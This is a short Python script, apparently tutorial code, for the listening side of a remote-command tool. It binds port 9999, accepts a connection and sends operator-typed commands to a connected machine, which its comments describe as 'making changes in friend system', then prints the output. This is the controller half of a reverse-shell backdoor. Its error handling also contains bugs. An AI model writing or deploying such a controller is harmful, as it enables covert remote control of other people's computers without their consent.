import socket
import sys  # used to implement command lines


# creating socket to connect two different computers
def create_socket():
    # handling any type of error
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    # printing the error
    except socket.error as msg:
        print("Socket error " + msg)


# Binding the socket and listening for connection
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the socket " + str(port))
        s.bind((host, port))  # binding host and port
        s.listen(5)  # it will listen for 5 times after that it will throw an error if connections not est.

    except socket.error as msg:
        print("Socket error " + msg + "\n" + "retrying...")
        bind_socket()


# establish connection with a client (socket must be listening)
def socket_accept():
    conn, address = s.accept()  # getting an object of connection and ip and port in adrress
    print("The ip and port adrress are " + address[0] + " and " + str(address[1]))
    send_command(conn)  # to make changes in friends computer
    conn.close()


# making changes in friend system
def send_command(conn):
    while True:
        cmd = input()
        if cmd == 'quit':  # to break out from this infinity while loop
            conn.close()
            s.close()
            sys.exit()

        # Data is send from one computer to another in the format of bytes so we have to encode our command in byte
        # format
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")  # here we are converting back byte to string format
            print(client_response)  # here is used to go to new line


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
